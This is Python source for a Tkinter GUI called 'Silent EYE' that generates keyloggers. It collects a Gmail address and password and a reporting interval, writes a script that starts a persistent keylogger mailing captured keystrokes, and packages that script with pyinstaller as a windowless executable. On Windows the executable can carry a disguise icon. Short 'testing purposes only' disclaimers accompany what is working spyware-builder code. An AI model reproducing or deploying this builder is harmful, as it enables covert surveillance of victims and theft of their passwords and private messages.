import webbrowser
import subprocess
import re
import os
import random
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox as m_box
from tkinter import filedialog
import time


class mac_changer:

    def callback(self,url):
        webbrowser.open_new(url)

    def __init__(self):
        root=tk.Tk()
        root.title("Silent EYE")
        root.geometry("380x420")

        #list of variables used in the entire program
        self.email=tk.StringVar() # for storing the email address in entry box
        self.password=tk.StringVar() # for storing password in entry box
        self.os=tk.StringVar()  # for store which os
        self.timer=tk.IntVar() # for storing the time interval in entry box
        self.output=tk.StringVar() # for storing the output path in entry box
        self.iconpath=tk.StringVar()#for storing the path of icon

        #menubar
        self.tabs=ttk.Notebook(root)
        self.home_tab=ttk.Frame(self.tabs)
        self.about_tab=ttk.Frame(self.tabs)
        self.tabs.add(self.home_tab,text="Home")
        self.tabs.add(self.about_tab,text="About")
        self.tabs.pack(expand=True,fill='both')

        #all label
        #email label
        self.email_label=ttk.Label(self.home_tab,text="Gmail : ")
        self.email_label.place(x=10,y=30)

        #password label
        self.password_label=ttk.Label(self.home_tab,text="Password : ")
        self.password_label.place(x=10,y=70)

        #link level to enable secure app on google
        self.enable_secure_app=ttk.Label(self.home_tab,foreground="blue",cursor="hand2",text = "click here to enable less secure app"                                                                                                                                                           )
        self.enable_secure_app.place(x=10,y=110)
        self.enable_secure_app.bind("<Button-1>", lambda e: self.callback("https://myaccount.google.com/lesssecureapps"))

        #timer label
        self.timer_label = ttk.Label(self.home_tab,text="Time Interval (Second) : ")
        self.timer_label.place(x=10,y=150)

        #icon label
        self.iconpath_label = ttk.Label(self.home_tab, text="Icon path : ")
        self.iconpath_label.place(x=10,y=230)

        #output path label
        self.output_path_label = ttk.Label(self.home_tab, text="Output name : ")
        self.output_path_label.place(x=10,y=270)

        #all enter box
        #email enter box
        self.email_entry = ttk.Entry(self.home_tab,width=30,textvariable=self.email)
        self.email_entry.place(x=80,y=28)

        #password entry box
        self.password_label_entry=ttk.Entry(self.home_tab,width=30,textvariable=self.password,show="*")
        self.password_label_entry.place(x=100,y=68)

        #icon path entry box
        self.iconpath_entry = ttk.Entry(self.home_tab,textvariable=self.iconpath,width=20,state=tk.DISABLED)
        self.iconpath_entry.place(x=100,y=230)

        #output path entry box
        self.output_path_entry = ttk.Entry(self.home_tab,width=30,textvariable=self.output)
        self.output_path_entry.place(x=115,y=268)


        #button
        # create button
        self.create_btn=tk.Button(self.home_tab,text="CREATE",command=self.create_btn_task,width=30)
        self.create_btn.place(x=60,y=310)

        #select file button
        self.select_file_btn = ttk.Button(self.home_tab,text="Select file",command=self.browse_file_method)
        self.select_file_btn.place(x=280,y=226)

        #radio button for os selection
        self.os_selection_windows =  ttk.Radiobutton(self.home_tab, text="WINDOWS",variable=self.os,value="windows")
        self.os_selection_windows.place(x=30,y=190)

        self.os_selection_linux = ttk.Radiobutton(self.home_tab, text="Linux",variable=self.os, value="linux")
        self.os_selection_linux.place(x=220,y=190)


        #spinbox for time interval
        self.time_spinbox = ttk.Spinbox(self.home_tab,from_ = 5, to = 86400,textvariable=self.timer, state='readonly')
        self.time_spinbox.set("50")
        self.time_spinbox.place(x=180,y=148)

        #about the developer
        self.about_label=ttk.Label(self.about_tab,text="DISCLAIMER: This is *only* for testing purposes.\nDo not use this for illegal purposes.\n\nAbout the Developer:\n\nfollow me on Github : github.com/altaf7740\nfollow me on Linkedin : linkedin.com/in/altaf7740\n\n\n   THANK YOU :)")
        self.about_label.grid(row=0,column=0)

        root.mainloop()

    def browse_file_method(self):
        self.iconpath_entry.config(state=tk.NORMAL)
        filename = tk.filedialog.askopenfilename(initialdir = "~", title= "select file",filetypes = (("icon files","*.ico"),("",""))) #("all files","*.*")
        self.iconpath_entry.delete(0,tk.END)
        self.iconpath_entry.insert(0,filename)
        self.iconpath_entry.config(state=tk.DISABLED)

    def compile_for_windows(self, file_name):
        if self.iconpath:
            subprocess.call(["pyinstaller", "--onefile", "--noconsole", "--icon", self.iconpath.get(), file_name],stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        else:
            subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name],stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


    def compile_for_linux(self, file_name):
        subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

    def create_keylogger(self):
        with open(self.output.get(), "w+") as file:
            file.write("import keylog\n")
            file.write("zlogger = keylog.Keylogger(" + str(self.timer.get()) + ",'" + self.email.get() + "','" + self.password.get() + "')\n")
            file.write("zlogger.become_persistent()\n")
            file.write("zlogger.start()\n")


    def create_btn_task(self):
        ttk.Label(self.home_tab,text=".........  Please wait  .........").place(x=110,y=345)
        self.progressbar=ttk.Progressbar(self.home_tab,orient=tk.HORIZONTAL,length=365, mode = 'determinate')
        self.progressbar.place(x=5,y=375)

        self.create_keylogger()
        self.progressbar['value']=10
        self.home_tab.update_idletasks()
        time.sleep(1)
        self.progressbar['value']=40
        self.home_tab.update_idletasks()
        time.sleep(1)
        self.progressbar['value']=60
        self.home_tab.update_idletasks()

        if self.os.get() == "windows":
            self.compile_for_windows(self.output.get())
        if self.os.get() == "linux":
            self.compile_for_linux(self.output.get())

        self.progressbar['value']=90
        self.home_tab.update_idletasks()
        time.sleep(1)
        self.progressbar['value']=100
        self.home_tab.update_idletasks()

        m_box.showinfo("success","file created  and Successfully Saved")

def main():
    print("Note that by using this software, if you ever see the creator of '8u7!N07!c3', you should (optional) give him a hug and should (optional) buy him a bourbon. Author has the option to refuse the hug and borbon (most likely will never happen)\n\n\nThe tool '8u7!N07!c3'  is designed purely for good and not evil. \nIf you are planning on using this tool for malicious purposes that are not authorized by the company you are performing assessments for, \nyou are violating the terms of service and license of this toolset\nBy hitting yes, \nyou agree to the terms of service and that you will only use this tool for lawful purposes only.\n\nDo you agree to the terms of service [y/n]:  ",end="")
    user_answer = input("")
    if user_answer == 'y' or user_answer == 'Y' or user_answer == 'yes' or user_answer == 'YES' or user_answer=='Yes':
        obj=mac_changer()
    else:
        print("okay, get lost !!!")

# if __main__ == "8u7iN07ic3":
    # main()
if __name__ == "__main__":
    main()
